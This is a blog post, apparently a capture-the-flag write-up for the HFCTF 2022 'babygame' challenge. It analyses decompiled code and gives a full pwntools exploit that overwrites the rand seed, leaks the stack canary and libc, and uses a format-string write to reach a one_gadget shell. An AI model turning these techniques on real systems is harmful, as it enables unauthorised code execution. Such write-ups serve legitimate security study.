---
layout: post
title: HFCTF 2022 babygame WP
subheading: 
author: dayfly
categories: wp
banner:
  video: null
  loop: true
  volume: 0.8
  start_at: 8.5
  image: https://images.pexels.com/photos/911738/pexels-photo-911738.jpeg?auto=compress&cs=tinysrgb&w=1260&h=750&dpr=2
  opacity: 0.618
  background: "#000"
  height: "100vh"
  min_height: "38vh"
  heading_style: "font-size: 5em; font-weight: bold; text-decoration: none; min-width: 1100px"
  subheading_style: "color: gold"
tags: [fmt, canary, srand]
# sidebar: []
---

## 题目检查

全绿
```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## 分析

- 首先进入main函数, buf存在栈溢出可以覆盖随机数种子并泄漏canary和一个栈地址,之后进入sub_1305函数

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char buf[256]; // [rsp+0h] [rbp-120h] BYREF
  unsigned int v5; // [rsp+100h] [rbp-20h]
  int v6; // [rsp+104h] [rbp-1Ch]
  unsigned __int64 v7; // [rsp+108h] [rbp-18h]

  v7 = __readfsqword(0x28u);
  ((void (__fastcall *)(__int64, char **, char **))((char *)&sub_1268 + 1))(a1, a2, a3);
  v5 = time(0LL);
  puts("Welcome to HFCTF!");
  puts("Please input your name:");
  read(0, buf, 0x256uLL);
  printf("Hello, %s\n", buf);
  srand(v5);
  v6 = sub_1305();
  if ( v6 > 0 )
    sub_13F7();
  return 0LL;
}
```

- 猜数字的一个游戏, 连续赢100次返回1

```c
__int64 sub_1305()
{
  int i; // [rsp+4h] [rbp-Ch]
  int v2; // [rsp+8h] [rbp-8h]
  int v3; // [rsp+Ch] [rbp-4h]

  puts("Let's start to play a game!");
  puts("0. rock");
  puts("1. scissor");
  puts("2. paper");
  for ( i = 0; i <= 99; ++i )
  {
    printf("round %d: \n", (unsigned int)(i + 1));
    v2 = rand() % 3;
    v3 = sub_129C();
    if ( v2 )
    {
      if ( v2 == 1 )
      {
        if ( v3 != 2 )
          return 0LL;
      }
      else if ( v2 == 2 && v3 )
      {
        return 0LL;
      }
    }
    else if ( v3 != 1 )
    {
      return 0LL;
    }
  }
  return 1LL;
}
```

- sub_13F7函数, 存在一个格式化字符串漏洞, 可以实现任意地址读写

```c
unsigned __int64 sub_13F7()
{
  char buf[264]; // [rsp+0h] [rbp-110h] BYREF
  unsigned __int64 v2; // [rsp+108h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("Good luck to you.");
  read(0, buf, 0x100uLL);
  printf(buf);
  return __readfsqword(0x28u) ^ v2;
}
```

## 思路

利用`main`函数中对`buf`进行溢出, 覆盖随机数种子, 并泄漏`canary`和栈地址, 控制随机数种子后满足`for`循环要求100次, 
成功进入`sub_13F7`函数后, 利用格式化字符串泄漏`libc`地址, 并控制`sub_13F7`函数的返回地址, 再次利用格式化字符串漏洞,
将`main`函数返回地址覆盖为`one_gadget`的地址


## 利用

```python
from pwn import *
from ctypes import *

context.log_level = 'debug'
context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

binary = './babygame'
elf = ELF(binary)
libc_path = './libc-2.31.so'
libc = ELF(libc_path)
libc_rand = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')
p = process(binary)

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(str(delim), data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(str(delim), data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims             :p.recvuntil(delims)
rl      = lambda                    :p.recvline()
rls     = lambda num=1              :p.recvlines(num)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4, b'\x00'))
uu64    = lambda data               :u64(data.ljust(8, b'\x00'))

# overwrite seed, leak canary and rbp
pay = b'b'*0x100 + p64(0x1111111111111111) + b'A'
sa('Please input your name:\n', pay)
ru(b'b'*0x100)
ru('A')
canary = uu64(b'\x00'+r(7))
rbp = uu64(r(6))
log.success(hex(canary))
log.success(hex(rbp))

# set seed
libc_rand.srand(0x1111111111111111)

# play game
for i in range(100):
        ru('round ' + str(i+1) + ': \n')
        num1 = libc_rand.rand()
        if (num1 % 3) == 1:
                sl('2')
        elif (num1 % 3) == 2:
                sl('0')
        else:
                sl('1')

# offset = 6
# overwrite ret address
pay = b'%62c%8$hhn' + b'%27$p' 
pay = pay.ljust(0x10, b'a') + p64(rbp-0x218)
sla('Good luck to you.\n', pay)

# leak libc
ru('0x')
libc_base = int(r(12), 16) - 20 - libc.symbols['atoi']
log.success('libc_base ' + hex(libc_base))

# one_gadget
# 0xe3b2e, 0xe3b31, 0xe3b34
pay = fmtstr_payload(6, {rbp-0x218:libc_base+0xe3b31})
sla('Good luck to you.\n', pay)
itr()

# mark, learn ctypes and x64 fmt
```
